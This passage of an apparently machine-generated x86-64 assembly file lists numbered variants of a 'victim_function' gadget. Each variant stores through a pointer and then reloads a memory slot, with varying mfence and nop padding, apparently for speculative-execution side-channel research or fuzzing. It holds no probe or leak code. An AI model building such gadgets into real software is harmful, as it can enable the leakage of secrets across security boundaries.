	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2381
.Lvictim_function_win0_var2381:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2382
.Lvictim_function_win0_var2382:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2383
.Lvictim_function_win0_var2383:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2384
.Lvictim_function_win0_var2384:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2385
.Lvictim_function_win0_var2385:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2386
.Lvictim_function_win0_var2386:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2387
.Lvictim_function_win0_var2387:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2388
.Lvictim_function_win0_var2388:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2389
.Lvictim_function_win0_var2389:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2390
.Lvictim_function_win0_var2390:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2391
.Lvictim_function_win0_var2391:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2392
.Lvictim_function_win0_var2392:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2393
.Lvictim_function_win0_var2393:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2394
.Lvictim_function_win0_var2394:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2395
.Lvictim_function_win0_var2395:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2396
.Lvictim_function_win0_var2396:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2397
.Lvictim_function_win0_var2397:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2398
.Lvictim_function_win0_var2398:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2399
.Lvictim_function_win0_var2399:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2400
.Lvictim_function_win0_var2400:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2401
.Lvictim_function_win0_var2401:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2402
.Lvictim_function_win0_var2402:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2403
.Lvictim_function_win0_var2403:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2404
.Lvictim_function_win0_var2404:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2405
.Lvictim_function_win0_var2405:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2406
.Lvictim_function_win0_var2406:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2407
.Lvictim_function_win0_var2407:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2408
.Lvictim_function_win0_var2408:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2409
.Lvictim_function_win0_var2409:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2410
.Lvictim_function_win0_var2410:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2411
.Lvictim_function_win0_var2411:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2412
.Lvictim_function_win0_var2412:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2413
.Lvictim_function_win0_var2413:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2414
.Lvictim_function_win0_var2414:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2415
.Lvictim_function_win0_var2415:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2416
.Lvictim_function_win0_var2416:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2417
.Lvictim_function_win0_var2417:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2418
.Lvictim_function_win0_var2418:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2419
.Lvictim_function_win0_var2419:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2420
.Lvictim_function_win0_var2420:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2421
.Lvictim_function_win0_var2421:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2422
.Lvictim_function_win0_var2422:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2423
.Lvictim_function_win0_var2423:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2424
.Lvictim_function_win0_var2424:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2425
.Lvictim_function_win0_var2425:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2426
.Lvictim_function_win0_var2426:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2427
.Lvictim_function_win0_var2427:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2428
.Lvictim_function_win0_var2428:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2429
.Lvictim_function_win0_var2429:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2430
.Lvictim_function_win0_var2430:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2431
.Lvictim_function_win0_var2431:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2432
.Lvictim_function_win0_var2432:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2433
.Lvictim_function_win0_var2433:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2434
.Lvictim_function_win0_var2434:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2435
.Lvictim_function_win0_var2435:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2436
.Lvictim_function_win0_var2436:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2437
.Lvictim_function_win0_var2437:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2438
.Lvictim_function_win0_var2438:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2439
.Lvictim_function_win0_var2439:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2440
.Lvictim_function_win0_var2440:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2441
.Lvictim_function_win0_var2441:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2442
.Lvictim_function_win0_var2442:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2443
.Lvictim_function_win0_var2443:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2444
.Lvictim_function_win0_var2444:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2445
.Lvictim_function_win0_var2445:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2446
.Lvictim_function_win0_var2446:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2447
.Lvictim_function_win0_var2447:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2448
.Lvictim_function_win0_var2448:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2449
.Lvictim_function_win0_var2449:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2450
.Lvictim_function_win0_var2450:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2451
.Lvictim_function_win0_var2451:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2452
.Lvictim_function_win0_var2452:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2453
.Lvictim_function_win0_var2453:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2454
.Lvictim_function_win0_var2454:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2455
.Lvictim_function_win0_var2455:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2456
.Lvictim_function_win0_var2456:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2457
.Lvictim_function_win0_var2457:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2458
.Lvictim_function_win0_var2458:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2459
.Lvictim_function_win0_var2459:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2460
.Lvictim_function_win0_var2460:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2461
.Lvictim_function_win0_var2461:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2462
.Lvictim_function_win0_var2462:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2463
.Lvictim_function_win0_var2463:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2464
.Lvictim_function_win0_var2464:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2465
.Lvictim_function_win0_var2465:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2466
.Lvictim_function_win0_var2466:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2467
.Lvictim_function_win0_var2467:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2468
.Lvictim_function_win0_var2468:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2469
.Lvictim_function_win0_var2469:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2470
.Lvictim_function_win0_var2470:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2471
.Lvictim_function_win0_var2471:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2472
.Lvictim_function_win0_var2472:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2473
.Lvictim_function_win0_var2473:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2474
.Lvictim_function_win0_var2474:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2475
.Lvictim_function_win0_var2475:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2476
.Lvictim_function_win0_var2476:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2477
.Lvictim_function_win0_var2477:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
